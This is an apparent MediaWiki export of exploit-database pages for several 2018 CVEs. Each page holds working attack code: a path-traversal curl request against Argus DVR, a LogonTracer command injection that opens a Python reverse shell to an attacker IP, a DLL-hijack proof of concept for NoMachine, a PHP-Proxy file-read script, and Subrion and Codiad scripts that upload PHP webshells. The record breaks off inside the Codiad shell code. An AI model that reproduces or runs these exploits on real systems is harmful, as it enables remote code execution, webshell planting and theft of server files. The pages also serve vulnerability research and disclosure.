      <comment>Created page with "==EXP== &lt;pre&gt; [+] Credits: John Page (aka hyp3rlinx)		 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/ARGUS-SURVEILLANCE-DVR-v4-..."</comment>
      <origin>683</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2628" sha1="a4zx6vm73ge2vps8tjqs10kyy22mb0y" xml:space="preserve">==EXP==
&lt;pre&gt;
[+] Credits: John Page (aka hyp3rlinx)		
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/ARGUS-SURVEILLANCE-DVR-v4-UNAUTHENTICATED-PATH-TRAVERSAL-FILE-DISCLOSURE.txt
[+] ISR: Apparition Security          
 
Greetz: ***Greetz: indoushka | Eduardo | GGA***


[Vendor]
www.argussurveillance.com


[Product]
Argus Surveillance DVR - 4.0.0.0

Our DVR software provides scheduled, continuous or activated upon motion detection video recording. You can monitor unlimited number of cameras, through Internet or on-site.
When our surveillance software detects motion in the monitored area, it sounds alarm, e-mails captured images, or records video.
This is security surveillance IP camera software. It has features to place image overlays and date/time stamps, adjust picture size / quality, and Pan/Tilt/Zoom control.


[Vulnerability Type]
Directory Traversal


[CVE Reference]
CVE-2018-15745


[Security Issue]
Argus Surveillance DVR 4.0.0.0 devices allow Unauthenticated Directory Traversal, leading to File Disclosure
via a ..%2F in the WEBACCOUNT.CGI RESULTPAGE parameter.


[Affected Component]
WEBACCOUNT.CGI RESULTPAGE parameter


[Exploit/POC]
curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&amp;USEREDIRECT=1&amp;WEBACCOUNTID=&amp;WEBACCOUNTPASSWORD="

; for 16-bit app support
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON
 
wave=mmdrv.dll
timer=timer.drv



[Video POC URL]
https://vimeo.com/287115273



[Network Access]
Remote



[Severity]
High



[Disclosure Timeline]
Vendor Notification: August 17, 2018
Second attempt: August 21, 2018
CVE Assigned Mitre: August 23, 2018
August 28, 2018 : Public Disclosure



[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).

hyp3rlinx

&lt;/pre&gt;</text>
      <sha1>a4zx6vm73ge2vps8tjqs10kyy22mb0y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-16167 LogonTracer 1.2.0 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>3326</id>
    <revision>
      <id>3884</id>
      <timestamp>2021-06-02T01:10:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: LogonTracer 1.2.0 - Remote Code Execution (Unauthenticated) # Date: 29/05/2021 # Exploit Author: g0ldm45k # Vendor Homepage: https://www.jpcert...."</comment>
      <origin>3884</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1336" sha1="p2v078q8cku0lhquqk4pc9wxmy8186z" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: LogonTracer 1.2.0 - Remote Code Execution (Unauthenticated)
# Date: 29/05/2021
# Exploit Author: g0ldm45k
# Vendor Homepage: https://www.jpcert.or.jp/
# Software Link: https://github.com/JPCERTCC/LogonTracer/releases/tag/v1.2.0
# Version: 1.2.0 and earlier
# Tested on: Version 1.2.0 on Debian GNU/Linux 8 (jessie)
# CVE : CVE-2018-16167

import requests
import argparse

parser = argparse.ArgumentParser(description='Send a payload to a LogonTracer 1.2.0 (or earlier) server.')
parser.add_argument('aip', type=str, help='Attacker ip')
parser.add_argument('aport', type=str, help='Attacker port')
parser.add_argument('victimurl', type=str, help='Victim URL minus the path.')

args = parser.parse_args()

ATTACKER_IP = args.aip
ATTACKER_PORT = args.aport
PAYLOAD = f"python -c 'import pty,socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"

VICTIM_URL = args.victimurl
VICTIM_ENDPOINT = "/upload"

DATA = {
    "logtype": "XML",
    "timezone": f"1;{PAYLOAD};",
}

print("[!] Sending request... If your terminal hangs, you might have a shell!")
requests.post(f"{VICTIM_URL}{VICTIM_ENDPOINT}", data=DATA)
print("[*] Done. Did you get what you wanted?")
&lt;/pre&gt;</text>
      <sha1>p2v078q8cku0lhquqk4pc9wxmy8186z</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-17980 NoMachine 5.3.26 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1204</id>
    <revision>
      <id>1508</id>
      <timestamp>2021-04-11T01:23:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== [+] Credits: John Page (aka hyp3rlinx)		 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/NOMACHINE-TROJAN-FILE-REMOTE-CO..."</comment>
      <origin>1508</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2863" sha1="7gzdijpmddwnt16k5oir5ck6ux2d8xq" xml:space="preserve">==INFO==
[+] Credits: John Page (aka hyp3rlinx)		
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/NOMACHINE-TROJAN-FILE-REMOTE-CODE-EXECUTION.txt
[+] ISR: ApparitionSec          
 
Greetz: ***Greetz: indoushka | Eduardo ***

[Vendor]
www.nomachine.com


[Product]
NoMachine  &lt;= v5.3.26

NX technology, developed by NoMachine, and commonly known as "NX" is a proprietary computer program that provides desktop and remote access.
It consists of a suite of products for desktop virtualization and application delivery for servers, and client software.



[Vulnerability Type]
Trojan File Remote Code Execution


[Affected Component]
wintab32.dll


[CVE Reference]
CVE-2018-17980


[Security Issue]
Possible arbitrary code execution when opening a ".nxs" nomachine file type on client's wintab32.dll preload.
This issue regards the client part of all NoMachine installations on Windows (NoMachine free, NoMachine Enterprise Client, NoMachine Enteprise Desktop and NoMachine Cloud Server).

1) create a 32 bit DLL named "wintab32.dll"
2) create an native nomachine ".NXS" file and open it alongside the trojan "wintab32.dll" DLL from Network share or any dir.
BOOM!


[References]
https://www.nomachine.com/TR10P08887



[Exploit/POC]

#include &lt;windows.h&gt;

/* hyp3rlinx */

/*
gcc -c -m32 wintab32.c
gcc -shared -m32 -o wintab32.dll wintab32.o
*/

void executo(){
 MessageBox( 0, "3c184981367094fce3ab70efc3b44583" , ":)" , MB_YESNO + MB_ICONQUESTION );
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
 switch(fdwReason){
  case DLL_PROCESS_ATTACH:{
	executo();
	break;
	}
  case DLL_PROCESS_DETACH:{
	executo();
	break;
	}
  case DLL_THREAD_ATTACH:{
	executo();
	break;
       }
  case DLL_THREAD_DETACH:{
	executo();
	break;
	}
   }
	return TRUE;
}


[Network Access]
Remote



[Severity]
High



[Disclosure Timeline]
Vendor Notification: September 26, 2018
Vendor verified vulnerability: September 28, 2018
CVE assigned by Mitre: October 4, 2018
Vendor release fixed version: October 11, 2018
October 11, 2018 : Public Disclosure



[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).

hyp3rlinx</text>
      <sha1>7gzdijpmddwnt16k5oir5ck6ux2d8xq</sha1>
    </revision>
    <revision>
      <id>1509</id>
      <parentid>1508</parentid>
      <timestamp>2021-04-11T01:23:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>1509</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2877" sha1="3ak04b32nslfrmbbd19ql28uog39ye1" xml:space="preserve">==INFO==
&lt;pre&gt;
[+] Credits: John Page (aka hyp3rlinx)		
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/NOMACHINE-TROJAN-FILE-REMOTE-CODE-EXECUTION.txt
[+] ISR: ApparitionSec          
 
Greetz: ***Greetz: indoushka | Eduardo ***

[Vendor]
www.nomachine.com


[Product]
NoMachine  &lt;= v5.3.26

NX technology, developed by NoMachine, and commonly known as "NX" is a proprietary computer program that provides desktop and remote access.
It consists of a suite of products for desktop virtualization and application delivery for servers, and client software.



[Vulnerability Type]
Trojan File Remote Code Execution


[Affected Component]
wintab32.dll


[CVE Reference]
CVE-2018-17980


[Security Issue]
Possible arbitrary code execution when opening a ".nxs" nomachine file type on client's wintab32.dll preload.
This issue regards the client part of all NoMachine installations on Windows (NoMachine free, NoMachine Enterprise Client, NoMachine Enteprise Desktop and NoMachine Cloud Server).

1) create a 32 bit DLL named "wintab32.dll"
2) create an native nomachine ".NXS" file and open it alongside the trojan "wintab32.dll" DLL from Network share or any dir.
BOOM!


[References]
https://www.nomachine.com/TR10P08887



[Exploit/POC]

#include &lt;windows.h&gt;

/* hyp3rlinx */

/*
gcc -c -m32 wintab32.c
gcc -shared -m32 -o wintab32.dll wintab32.o
*/

void executo(){
 MessageBox( 0, "3c184981367094fce3ab70efc3b44583" , ":)" , MB_YESNO + MB_ICONQUESTION );
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
 switch(fdwReason){
  case DLL_PROCESS_ATTACH:{
	executo();
	break;
	}
  case DLL_PROCESS_DETACH:{
	executo();
	break;
	}
  case DLL_THREAD_ATTACH:{
	executo();
	break;
       }
  case DLL_THREAD_DETACH:{
	executo();
	break;
	}
   }
	return TRUE;
}


[Network Access]
Remote



[Severity]
High



[Disclosure Timeline]
Vendor Notification: September 26, 2018
Vendor verified vulnerability: September 28, 2018
CVE assigned by Mitre: October 4, 2018
Vendor release fixed version: October 11, 2018
October 11, 2018 : Public Disclosure



[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).

hyp3rlinx

&lt;/pre&gt;</text>
      <sha1>3ak04b32nslfrmbbd19ql28uog39ye1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-19246 PHP-Proxy 5.1.0本地文件包含漏洞</title>
    <ns>0</ns>
    <id>471</id>
    <revision>
      <id>672</id>
      <timestamp>2021-03-27T02:33:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; # Exploit Title: PHP-Proxy 5.1.0 - Local File Inclusion # Date: 2018-11-13 # Exploit Author: Ameer Pornillos # Contact: https://ethicalhackers.club # Vendor Home..."</comment>
      <origin>672</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1670" sha1="f5rgso0jlz3gvqdma7yu10xh7nmj0vg" xml:space="preserve">==POC==
&lt;pre&gt;
# Exploit Title: PHP-Proxy 5.1.0 - Local File Inclusion
# Date: 2018-11-13
# Exploit Author: Ameer Pornillos
# Contact: https://ethicalhackers.club
# Vendor Homepage: https://www.php-proxy.com/
# Software Link: https://www.php-proxy.com/download/php-proxy.zip
# Version: 5.1.0
# Category: Webapps
# Tested on: XAMPP on Win10_x64
# Description: Downloadable pre-installed version of PHP-Proxy 5.1.0
# make use of a default app_key wherein can be used for local file inclusion
# attacks. This can be used to generate encrypted string which
# can gain access to arbitrary local files in the server.
# http://php-proxy-site/index.php?q=[encrypted_string_value]
# CVE: CVE-2018-19246
 
# POC:
# 1)
# Generate encrypted string value using the PHP script below
# 2)
# Browse to URL
# http://php-proxy-site/index.php?q=[encrypted_string_value]
# to read local file
 
&lt;?php
$file = "file:///C:/xampp/passwords.txt"; //example target file to read
$ip = "192.168.0.1"; //change depending on your IP address that access the app
$app_key = "aeb067ca0aa9a3193dce3a7264c90187";
$key = md5($app_key.$ip);
function str_rot_pass($str, $key, $decrypt = false){
    $key_len = strlen($key);
    $result = str_repeat(' ', strlen($str));
    for($i=0; $i&lt;strlen($str); $i++){
        if($decrypt){
            $ascii = ord($str[$i]) - ord($key[$i % $key_len]);
        } else {
            $ascii = ord($str[$i]) + ord($key[$i % $key_len]);
        }
        $result[$i] = chr($ascii);
    }
    return $result;
}
function base64_url_encode($input){
    return rtrim(strtr(base64_encode($input), '+/', '-_'), '=');
}
echo base64_url_encode(str_rot_pass($file, $key));
?&gt; 
&lt;/pre&gt;</text>
      <sha1>f5rgso0jlz3gvqdma7yu10xh7nmj0vg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-19422 Subrion CMS 4.2.1 任意文件上傳&amp;RCE漏洞</title>
    <ns>0</ns>
    <id>2401</id>
    <revision>
      <id>2889</id>
      <timestamp>2021-05-17T10:24:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Subrion CMS 4.2.1 - File Upload Bypass to RCE (Authenticated) # Date: 17/05/2021 # Exploit Author: Fellipe Oliveira # Vendor Homepage: https://s..."</comment>
      <origin>2889</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5832" sha1="oc05errwglecikw8ox48hlrihca4kea" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Subrion CMS 4.2.1 - File Upload Bypass to RCE (Authenticated)
# Date: 17/05/2021
# Exploit Author: Fellipe Oliveira
# Vendor Homepage: https://subrion.org/
# Software Link: https://github.com/intelliants/subrion
# Version: SubrionCMS 4.2.1
# Tested on: Debian9, Debian 10 and Ubuntu 16.04
# CVE: CVE-2018-19422
# Exploit Requirements: BeautifulSoup library
# https://github.com/intelliants/subrion/issues/801

#!/usr/bin/python3

import requests
import time
import optparse
import random
import string
from bs4 import BeautifulSoup

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri http://target/panel")
parser.add_option('-l', '--user', action="store", dest="user", help="User credential to login")
parser.add_option('-p', '--passw', action="store", dest="passw", help="Password credential to login")

options, args = parser.parse_args()

if not options.url:
    print('[+] Specify an url target')
    print('[+] Example usage: exploit.py -u http://target-uri/panel')
    print('[+] Example help usage: exploit.py -h')
    exit()

url_login = options.url
url_upload = options.url + 'uploads/read.json'
url_shell = options.url + 'uploads/'
username = options.user
password = options.passw

session = requests.Session()

def login():
    global csrfToken
    print('[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 \n')
    print('[+] Trying to connect to: ' + url_login)
    try:
        get_token_request = session.get(url_login)
        soup = BeautifulSoup(get_token_request.text, 'html.parser')
        csrfToken = soup.find('input',attrs = {'name':'__st'})['value']
        print('[+] Success!')
        time.sleep(1)

        if csrfToken:
            print(f"[+] Got CSRF token: {csrfToken}")
            print("[+] Trying to log in...") 

            auth_url = url_login
            auth_cookies = {"loader": "loaded"}
            auth_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.1.20", "Connection": "close", "Referer": "http://192.168.1.20/panel/", "Upgrade-Insecure-Requests": "1"}
            auth_data = {"__st": csrfToken, "username": username, "password": password}
            auth = session.post(auth_url, headers=auth_headers, cookies=auth_cookies, data=auth_data)

            if len(auth.text) &lt;= 7000:
                print('\n[x] Login failed... Check credentials')
                exit()
            else:
                print('[+] Login Successful!\n')
        else:
            print('[x] Failed to got CSRF token')
            exit()

    except requests.exceptions.ConnectionError as err:
        print('\n[x] Failed to Connect in: '+url_login+' ')
        print('[x] This host seems to be Down')
        exit()

    return csrfToken

def name_rnd():
    global shell_name 
    print('[+] Generating random name for Webshell...')
    shell_name = ''.join((random.choice(string.ascii_lowercase) for x in range(15)))
    time.sleep(1)  
    print('[+] Generated webshell name: '+shell_name+'\n')

    return shell_name

def shell_upload():
    print('[+] Trying to Upload Webshell..')
    try:
        up_url = url_upload
        up_cookies = {"INTELLI_06c8042c3d": "15ajqmku31n5e893djc8k8g7a0", "loader": "loaded"}
        up_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "*/*", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------6159367931540763043609390275", "Origin": "http://192.168.1.20", "Connection": "close", "Referer": "http://192.168.1.20/panel/uploads/"}
        up_data = "-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n17978446266285\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"__st\"\r\n\r\n"+csrfToken+"\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\""+shell_name+".phar\"\r\nContent-Type: application/octet-stream\r\n\r\n&lt;?php system($_GET['cmd']); ?&gt;\n\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1621210391\r\n-----------------------------6159367931540763043609390275--\r\n"
        session.post(up_url, headers=up_headers, cookies=up_cookies, data=up_data)
    
    except requests.exceptions.HTTPError as conn:
        print('[x] Failed to Upload Webshell in: '+url_upload+' ')
        exit()

def code_exec():
    try:
        url_clean = url_shell.replace('/panel', '')
        req = session.get(url_clean + shell_name + '.phar?cmd=id')

        if req.status_code == 200:
            print('[+] Upload Success... Webshell path: ' + url_shell + shell_name + '.phar \n')
            while True:
                cmd = input('$ ')
                x = session.get(url_clean + shell_name + '.phar?cmd='+cmd+'')
                print(x.text)
        else:
            print('\n[x] Webshell not found... upload seems to have failed')
    except:
        print('\n[x] Failed to execute PHP code...')

login()
name_rnd()
shell_upload()
code_exec()
&lt;/pre&gt;</text>
      <sha1>oc05errwglecikw8ox48hlrihca4kea</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-19423 Codiad 2.8.4 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>2789</id>
    <revision>
      <id>3290</id>
      <timestamp>2021-05-26T12:18:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (3) # Date: 24.05.2021 # Exploit Author: Ron Jost (Hacker5preme) # Vendor Homepage: http://..."</comment>
      <origin>3290</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="21934" sha1="d1tu80xskyea7jkgnbob78lf7rl3n93" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)
# Date: 24.05.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: http://codiad.com/
# Software Link: https://github.com/Codiad/Codiad/releases/tag/v.2.8.4
# Version: 2.8.4
# Tested on Xubuntu 20.04
# CVE: CVE-2018-19423

'''
Description:
Codiad 2.8.4 allows remote authenticated administrators to execute arbitrary code by uploading an executable file.
'''


'''
Import required modules:
'''
import requests
import json
import time
import sys
import urllib.parse

'''
User Input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]
username = sys.argv[3]
password = sys.argv[4]
codiadpath = input('Please input the path of Codiad( for example: / ): ')
projectname = input('Please input the name of the actual project: ')



'''
Get cookie
'''
session = requests.Session()
link = 'http://' + target_ip + ':' + target_port + codiadpath
response = session.get(link)
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')


'''
Authentication:
'''
# Compute Content-Length:
base_content_len = 45
username_encoded = urllib.parse.quote(username, safe='')
username_encoded_len = len(username_encoded.encode('utf-8'))
password_encoded = urllib.parse.quote(password, safe='')
password_encoded_len = len(password_encoded.encode('utf-8'))
content_len = base_content_len + username_encoded_len + password_encoded_len

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': '*/*',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': str(content_len),
    'Origin': 'http://' + target_ip + ':' + target_port,
    'Connection': 'close',
    'Referer': 'http://' + target_ip + ':' + target_port + '/',
    'Cookie': cookie
}

# Body:
body = {
    'username': username,
    'password': password,
    'theme': 'default',
    'language': 'en'
}

# Post authentication request:
link_base = 'http://' + target_ip + ':' + target_port + codiadpath
link_auth = link_base + 'components/user/controller.php?action=authenticate'
print('')
print('Posting authentication request: ')
auth = requests.post(link_auth, headers=header, data=body)
print('Response: ')
print(auth.text)
time.sleep(2)


'''
Upload Webshell:
'''
# Construct Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    "Content-Type": "multipart/form-data; boundary=---------------------------289777152427948045812862014674",
    'Connection': 'close',
    'Cookie': cookie,
    'Upgrade-Insecure-Requests': '1'
}

# Construct Shell Payload: https://github.com/flozz/p0wny-shell
data = "\r\n\r\n\r\n-----------------------------289777152427948045812862014674\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if 